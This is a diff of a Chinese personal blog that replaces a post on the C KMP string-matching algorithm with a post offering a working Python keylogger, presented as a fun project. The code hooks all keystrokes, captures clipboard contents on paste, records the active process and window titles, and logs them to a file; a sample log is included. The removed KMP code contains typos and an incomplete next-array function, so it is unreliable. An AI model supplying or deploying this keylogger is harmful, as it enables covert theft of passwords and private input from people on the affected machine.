@@ -105,19 +105,16 @@
 
 
 
-<meta name="description" content="最近在学数据结构，学到模式匹配算法，KMP算法是比较经典的模式匹配算法，其核心是避免主串指针不必要的回溯，建立模式串T的next数组，为了能够准确理解KMP算法，我们可以先用暴力匹配算法实现。
-暴力匹配算法1234567891011121314151617181920int ViolentMatch(char *S, char *T)&amp;#123;    int i = 1, j = 1;    /">
+<meta name="description" content="最近发现了一个好玩的项目，就是利用python实现一个键盘记录器，代码也不多，70多行，主要是利用python库pyhook实现。python代码如下所示：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656">
 <meta property="og:type" content="article">
-<meta property="og:title" content="C语言-KMP算法的实现">
-<meta property="og:url" content="https://kakalex.github.io/2017/08/08/C语言-KMP算法的实现/index.html">
+<meta property="og:title" content="用python实现键盘记录器">
+<meta property="og:url" content="https://kakalex.github.io/2017/09/22/用python实现键盘记录器/index.html">
 <meta property="og:site_name" content="Alex’s Notes">
-<meta property="og:description" content="最近在学数据结构，学到模式匹配算法，KMP算法是比较经典的模式匹配算法，其核心是避免主串指针不必要的回溯，建立模式串T的next数组，为了能够准确理解KMP算法，我们可以先用暴力匹配算法实现。
-暴力匹配算法1234567891011121314151617181920int ViolentMatch(char *S, char *T)&amp;#123;    int i = 1, j = 1;    /">
-<meta property="og:updated_time" content="2017-08-08T16:46:22.107Z">
+<meta property="og:description" content="最近发现了一个好玩的项目，就是利用python实现一个键盘记录器，代码也不多，70多行，主要是利用python库pyhook实现。python代码如下所示：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656">
+<meta property="og:updated_time" content="2017-09-21T16:53:18.467Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="C语言-KMP算法的实现">
-<meta name="twitter:description" content="最近在学数据结构，学到模式匹配算法，KMP算法是比较经典的模式匹配算法，其核心是避免主串指针不必要的回溯，建立模式串T的next数组，为了能够准确理解KMP算法，我们可以先用暴力匹配算法实现。
-暴力匹配算法1234567891011121314151617181920int ViolentMatch(char *S, char *T)&amp;#123;    int i = 1, j = 1;    /">
+<meta name="twitter:title" content="用python实现键盘记录器">
+<meta name="twitter:description" content="最近发现了一个好玩的项目，就是利用python实现一个键盘记录器，代码也不多，70多行，主要是利用python库pyhook实现。python代码如下所示：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656">
 
 
 
@@ -145,13 +142,13 @@
 
 
 
-  <link rel="canonical" href="https://kakalex.github.io/2017/08/08/C语言-KMP算法的实现/"/>
+  <link rel="canonical" href="https://kakalex.github.io/2017/09/22/用python实现键盘记录器/"/>
 
 
 
 
 
-  <title> C语言-KMP算法的实现 | Alex’s Notes </title>
+  <title> 用python实现键盘记录器 | Alex’s Notes </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -280,7 +277,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="https://kakalex.github.io/2017/08/08/C语言-KMP算法的实现/">
+    <link itemprop="mainEntityOfPage" href="https://kakalex.github.io/2017/09/22/用python实现键盘记录器/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Alex">
@@ -301,7 +298,7 @@
             
             
               
-                C语言-KMP算法的实现
+                用python实现键盘记录器
               
             
           </h1>
@@ -316,8 +313,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-08T23:30:19+08:00">
-                2017-08-08
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-22T00:19:22+08:00">
+                2017-09-22
               </time>
             
 
@@ -334,7 +331,7 @@
 
           
           
-             <span id="/2017/08/08/C语言-KMP算法的实现/" class="leancloud_visitors" data-flag-title="C语言-KMP算法的实现">
+             <span id="/2017/09/22/用python实现键盘记录器/" class="leancloud_visitors" data-flag-title="用python实现键盘记录器">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -368,13 +365,10 @@
       
 
       
-        <p>最近在学数据结构，学到模式匹配算法，KMP算法是比较经典的模式匹配算法，其核心是避免主串指针不必要的回溯，建立模式串T的next数组，为了能够准确理解KMP算法，我们可以先用暴力匹配算法实现。</p>
-<p>暴力匹配算法<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ViolentMatch</span><span class="params">(<span class="keyword">char</span> *S, <span class="keyword">char</span> *T)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i = <span class="number">1</span>, j = <span class="number">1</span>;</div><div class="line">    <span class="comment">//S[0]为主串字符长度,T[0]为模式串字符的长度</span></div><div class="line">    <span class="keyword">while</span>(i &lt; S[<span class="number">0</span>] &amp;&amp; j &lt; T[<span class="number">0</span>])</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (S[i] == T[j])</div><div class="line">        &#123;</div><div class="line">            ++i, ++j;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            i = i - j + <span class="number">1</span>, j = <span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(j == T[<span class="number">0</span>]) <span class="keyword">return</span> i-j;</div><div class="line">    <span class="keyword">else</span> rerurn <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>KMP算法</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">KMP_Match</span><span class="params">(<span class="keyword">char</span> *S, <span class="keyword">char</span> *T)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i = <span class="number">1</span>, j = <span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> *next;</div><div class="line">    get_next(T, next);</div><div class="line">    <span class="keyword">while</span>(i &lt; S[<span class="number">0</span>] &amp;&amp; j &lt; T[<span class="number">0</span>])</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(S[i] == T[j] || j == <span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">            i++, j++;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            j = next[j]</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(j == T[<span class="number">0</span>]) retrun i-j;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>我们可以看出模式匹配算法的时间复杂度主要和模式串T有关，可以先构造模式串的next数组。</p>
-<p>模式串next数组<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_next</span><span class="params">(<span class="keyword">char</span> *T, <span class="keyword">int</span> next[])</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>;</div><div class="line">    next[<span class="number">1</span>] = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span>(i &lt; T[<span class="number">0</span>])</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(T[i] == T[j])</div><div class="line">        &#123;</div><div class="line">            i++;</div><div class="line">            j++;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> j = next[j];</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>重点：KMP算法主要建立模式串next数组来避免主串指针不必要的回溯。</p>
+        <p>最近发现了一个好玩的项目，就是利用python实现一个键盘记录器，代码也不多，70多行，主要是利用python库pyhook实现。<br>python代码如下所示：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pyHook</div><div class="line"><span class="keyword">import</span> pythoncom</div><div class="line"><span class="keyword">from</span>   ctypes <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> win32clipboard</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">onKeyboardEvent</span><span class="params">(event)</span>:</span></div><div class="line">    </div><div class="line">    user32 = windll.user32  </div><div class="line">    kernel32 = windll.kernel32  </div><div class="line">    psapi = windll.psapi  </div><div class="line">    hwnd = user32.GetForegroundWindow()</div><div class="line"></div><div class="line">    pid = c_ulong(<span class="number">0</span>)  </div><div class="line">    user32.GetWindowThreadProcessId(hwnd,byref(pid))  </div><div class="line"></div><div class="line">    <span class="comment"># 将进程ID存入变量中  </span></div><div class="line">    process_id = <span class="string">"%d"</span> % pid.value </div><div class="line"></div><div class="line">    executable = create_string_buffer(<span class="number">512</span>)  </div><div class="line">    h_process = kernel32.OpenProcess(<span class="number">0x400</span> | <span class="number">0x10</span>,<span class="keyword">False</span>,pid)  </div><div class="line"></div><div class="line">    psapi.GetModuleBaseNameA(h_process,<span class="keyword">None</span>,byref(executable),<span class="number">512</span>)  </div><div class="line"></div><div class="line">    <span class="comment"># 读取窗口标题  </span></div><div class="line">    windows_title = create_string_buffer(<span class="number">512</span>)  </div><div class="line">    length = user32.GetWindowTextA(hwnd,byref(windows_title),<span class="number">512</span>)   </div><div class="line"></div><div class="line">    <span class="comment"># 关闭handles  </span></div><div class="line">    kernel32.CloseHandle(hwnd)  </div><div class="line">    kernel32.CloseHandle(h_process)</div><div class="line">    time1 = time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime())</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> event.Ascii &gt; <span class="number">32</span> <span class="keyword">and</span> event.Ascii &lt;<span class="number">127</span>:  </div><div class="line">        Key = chr(event.Ascii)</div><div class="line">    <span class="keyword">else</span>:  </div><div class="line">        <span class="comment"># 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来  </span></div><div class="line">        <span class="keyword">if</span> event.Key == <span class="string">"V"</span>:  </div><div class="line">            win32clipboard.OpenClipboard()  </div><div class="line">            pasted_value = win32clipboard.GetClipboardData()  </div><div class="line">            win32clipboard.CloseClipboard()  </div><div class="line">            Key = <span class="string">"[PASTE]- %s"</span> % pasted_value   </div><div class="line">        <span class="keyword">else</span>:  </div><div class="line">            Key = <span class="string">"[%s]"</span> % event.Key</div><div class="line"></div><div class="line">    temp = <span class="string">"%-10s%s\t%s\t%-10s\t%s\n"</span> %(Key, time1, process_id, executable.value.decode(<span class="string">'GBK'</span>), windows_title.value.decode(<span class="string">'GBK'</span>))</div><div class="line">    print(temp)</div><div class="line">    <span class="keyword">with</span> open(<span class="string">'log.txt'</span>, <span class="string">'at'</span>) <span class="keyword">as</span> fout:</div><div class="line">        </div><div class="line">        fout.write(temp)</div><div class="line"></div><div class="line">	<span class="comment">#按F12结束</span></div><div class="line">    <span class="keyword">if</span> event.Key == <span class="string">'F12'</span>:</div><div class="line">        print(<span class="string">'[Finish]'</span>,time1, <span class="string">'*'</span>*<span class="number">10</span>, <span class="string">'!!!'</span>)</div><div class="line">        win32api.PostQuitMessage()</div><div class="line">    <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    print(<span class="string">'All done!!!'</span>)</div><div class="line"></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'log.txt'</span>, <span class="string">'xt'</span>) <span class="keyword">as</span> fout:      </div><div class="line">        fout.write(<span class="string">'[Start]'</span>)</div><div class="line">    hm = pyHook.HookManager()</div><div class="line">    hm.KeyDown = onKeyboardEvent</div><div class="line">    hm.HookKeyboard()</div><div class="line">    pythoncom.PumpMessages()</div></pre></td></tr></table></figure></p>
+<p>由于pyhook中event.WindowsName中出现乱码，可能是版本的原因吧，本文采用内置库ctypes解决！！！<br>如果各位有兴趣也可以加入鼠标监控，方法和键盘监控一样。</p>
+<p>下面为log.txt中的部分内容，大家也可以在优化以下。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">[Lcontrol]2017-09-22 00:38:34	21068	chrome.exe	212_百度搜索 - Google Chrome</div><div class="line">[Lcontrol]2017-09-22 00:38:34	21068	chrome.exe	212_百度搜索 - Google Chrome</div><div class="line">[Lcontrol]2017-09-22 00:38:34	21068	chrome.exe	212_百度搜索 - Google Chrome</div><div class="line">[Lcontrol]2017-09-22 00:38:34	21068	chrome.exe	212_百度搜索 - Google Chrome</div><div class="line">[Lcontrol]2017-09-22 00:38:34	21068	chrome.exe	212_百度搜索 - Google Chrome</div><div class="line">[Lcontrol]2017-09-22 00:38:34	21068	chrome.exe	212_百度搜索 - Google Chrome</div><div class="line">[Lcontrol]2017-09-22 00:38:34	21068	chrome.exe	212_百度搜索 - Google Chrome</div><div class="line">[Lcontrol]2017-09-22 00:38:35	21068	chrome.exe	212_百度搜索 - Google Chrome</div><div class="line">[Lcontrol]2017-09-22 00:38:35	21068	chrome.exe	212_百度搜索 - Google Chrome</div></pre></td></tr></table></figure>
 
       
     </div>
@@ -411,8 +405,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/03/23/利用python实现微信好友-消息防撤回/" rel="next" title="利用python实现微信好友/消息防撤回">
-                <i class="fa fa-chevron-left"></i> 利用python实现微信好友/消息防撤回
+              <a href="/2017/09/06/python实现爬取妹子图/" rel="next" title="python实现爬取妹子图">
+                <i class="fa fa-chevron-left"></i> python实现爬取妹子图
               </a>
             
           </div>
@@ -420,10 +414,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/08/13/python面试资料/" rel="prev" title="python面试资料">
-                python面试资料 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
